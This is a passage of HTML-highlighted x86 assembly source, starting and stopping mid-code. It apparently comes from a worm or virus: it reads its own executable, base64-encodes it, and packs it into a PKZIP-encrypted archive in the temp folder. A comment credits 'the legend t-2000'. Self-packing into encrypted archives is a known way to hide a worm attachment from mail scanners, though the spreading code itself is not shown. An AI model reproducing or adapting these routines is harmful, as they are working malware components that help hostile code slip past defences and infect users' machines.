    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">ReadFile</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@ptr_b64</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hvmem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">base64encode</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
    
    </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">endp</span><span class="sc0">
    
</span><span class="sc5">base64encode</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@src</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@dest</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@srclen</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@src</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@dest</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">@@b64loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@srclen2</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03d3dh</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@b64next</span><span class="sc0">

    </span><span class="sc5">@@srclen2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@srclen3</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03dh</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@b64next</span><span class="sc0">
    </span><span class="sc5">@@srclen3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">

    </span><span class="sc5">@@b64next</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">@@b64n_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fc000000h</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">@@b64table</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@b64n_loop</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@srclen</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@b64loop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@b64table</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="sc0">
    </span><span class="sc9">endp</span><span class="sc0">
    
    
</span><span class="sc1">;;;  ------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;;;   generate encripted zip</span><span class="sc0">
</span><span class="sc1">;;;  </span><span class="sc0">
</span><span class="sc1">;;;   the legend t-2000</span><span class="sc0">
</span><span class="sc5">enc_zip_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">thisfilename</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetFileSize</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lh_uncompressed_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ch_uncompressed_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lh_compressed_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lh_compressed_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecd_central_dir</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">archive_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">archive_size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">ReadFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">zipfilepath</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetTempPathA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@error_exit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">zip_filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">zipfilepath</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrcat</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">zipfilepath</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_encrypted_zip</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">len_local_header</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">local_header</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">archive_size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">len_central_header</span><span class="sc4">+</span><span class="sc5">len_ch_directory</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">central_header</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

    </span><span class="sc5">@@exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">@@error_exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    

</span><span class="sc5">write_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">WriteFile</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">gen_encrypted_zip</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@init_cipher_key</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">len_cipher_key</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">cipher_key</span><span class="sc0">
    
    </span><span class="sc5">@@init_keys</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@update_keys</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@init_keys</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetTickCount</span><span class="sc0">

    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0deadbeefh</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">666</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lh_uncompressed_size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@crc</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lh_crc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ch_crc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lh_compressed_size</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">@@encrypt_stream</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@update_keys</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@encrypt_stream</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
    </span><span class="sc5">@@update_keys</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@update_crc</span><span class="sc0">

    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key0</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">134775813</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@update_crc</span><span class="sc0">

    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">@@update_crc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crc_init</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">byte_to_crc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc5">@@crc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crc_init</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">

